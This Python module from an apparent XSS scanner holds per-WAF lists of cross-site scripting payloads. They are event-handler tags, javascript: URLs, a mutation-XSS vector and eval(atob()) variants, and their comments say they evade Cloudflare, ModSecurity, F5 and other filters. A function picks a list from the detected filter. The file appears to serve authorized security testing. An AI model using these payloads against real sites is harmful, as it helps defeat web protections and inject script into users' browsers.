"""Per-WAF + per-filter payload playbooks (marker-agnostic templates).

Templates use the same placeholders as the generator:
``M`` → unique marker, ``PO`` → ``alert('marker')``, ``Q`` → quote char.
"""

from __future__ import annotations

from typing import List

from intellixss.models import FilterType

# High-signal payloads that often evade naive blocklists (labs / authorized tests).
SUCURI_PAYLOADS = [
    "<svg/onload=PO>",
    "<img src=x onerror=PO>",
    "<details open ontoggle=PO>",
    "<xss id=x tabindex=1 onfocus=PO>",
    "<img src=x onpointerover=PO>",
    "<svg onload=PO>",
    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;('M')>",
    '"><img src=x onerror=PO>',
    "<body onpageshow=PO>",
]

CLOUDFLARE_PAYLOADS = [
    "<svg/onload=PO>",
    "<img\tsrc=x\tonerror=PO>",
    "<details open ontoggle=PO>",
    "<img src=x onerror=PO>",
    "<a href=javascript:PO>x</a>",
    '"><svg onload=PO>',
    # Mutation-XSS via mXSS vectors that survive naive tag stripping
    "<math><mtext><table><mglyph><style><!--</style><img title='--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=x onerror=PO&gt;'>",
    "<svg><animate onbegin=PO attributeName=x dur=1s>",
]

MODSEC_PAYLOADS = [
    "<img src=x onerror=PO>",
    "<svg onload=PO>",
    "<script>PO</script>",
    '"><img src=x onerror=PO>',
    "<img src=x oNeRrOr=PO>",
    # CRS blocks keyword 'alert'; eval(atob()) carries none
    "<img src=x onerror=eval(atob('BASE64_PLACEHOLDER'))>",
]

GENERIC_WAF = [
    "<svg/onload=PO>",
    "<img src=x onerror=PO>",
    "<details open ontoggle=PO>",
    "<img\tsrc onerror=PO>",
    "<img/src=x onerror=PO>",
    "<xss onfocus=PO autofocus tabindex=1>",
    "javascript:PO",
    # Encoded-eval variant: defeats keyword matching on alert/confirm/prompt
    "<img src=x onerror=eval(atob('BASE64_PLACEHOLDER'))>",
]

F5_PAYLOADS = [
    "<img/src=x onerror=PO>",
    "<img src=x\nonerror=PO>",
    "<svg/onload=eval(atob('BASE64_PLACEHOLDER'))>",
]

FORTIWEB_PAYLOADS = [
    "<svg/onload=PO>",
    "<img src=x onerror=PO>",
    "<details/open/ontoggle=PO>",
]

BARRACUDA_PAYLOADS = [
    "<svg/onload=PO>",
    "<body onload=PO>",
    "<img src=x onerror=PO>",
]

AZURE_PAYLOADS = [
    "<svg/onload=PO>",
    "<img src=x onerror=PO>",
    "<a href=javascript:PO>x</a>",
]


def profile_for_filters(filters: List[FilterType]) -> str:
    pairs = [
        (FilterType.WAF_SUCURI, "sucuri"),
        (FilterType.WAF_CLOUDFLARE, "cloudflare"),
        (FilterType.WAF_MODSEC, "modsec"),
        (FilterType.WAF_F5_BIG_IP, "f5"),
        (FilterType.WAF_FORTIWEB, "fortiweb"),
        (FilterType.WAF_BARRACUDA, "barracuda"),
        (FilterType.WAF_AZURE, "azure"),
        (
            FilterType.WAF_GENERIC,
            "generic_waf",
        ),
        (FilterType.WAF_AKAMAI, "generic_waf"),
        (FilterType.WAF_AWS, "generic_waf"),
        (FilterType.WAF_IMPERVA, "generic_waf"),
    ]
    for ftype, name in pairs:
        if ftype in filters:
            return name
    return "none"


_BY_PROFILE = {
    "sucuri": SUCURI_PAYLOADS,
    "cloudflare": CLOUDFLARE_PAYLOADS,
    "modsec": MODSEC_PAYLOADS,
    "generic_waf": GENERIC_WAF,
    "f5": F5_PAYLOADS,
    "fortiweb": FORTIWEB_PAYLOADS,
    "barracuda": BARRACUDA_PAYLOADS,
    "azure": AZURE_PAYLOADS,
}


def get_waf_payloads(filters: List[FilterType]) -> List[str]:
    profile = profile_for_filters(filters)
    return list(_BY_PROFILE.get(profile, []))
